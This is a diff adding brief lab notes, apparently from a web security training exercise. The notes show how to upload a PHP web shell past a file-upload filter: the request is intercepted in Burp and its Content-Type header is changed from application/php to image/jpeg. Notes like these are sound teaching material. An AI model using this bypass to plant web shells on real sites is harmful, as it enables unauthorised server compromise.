@@ -1,0 +1,16 @@
+Just like the previous lab, craft an exploit and upload it
+
+notice it refused to accept this ?
+
+intercept the the POST upload in burp and send to repeater
+
+now, change
+------WebKitFormBoundaryNb1S3vQQWAASBdBd
+Content-Disposition: form-data; name="avatar"; filename="shell.php"
+Content-Type: application/php <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< this is the line of focus, only thing needed to be changed even
+to
+------WebKitFormBoundaryNb1S3vQQWAASBdBd
+Content-Disposition: form-data; name="avatar"; filename="shell.php"
+Content-Type: image/jpeg
+
+and send once more
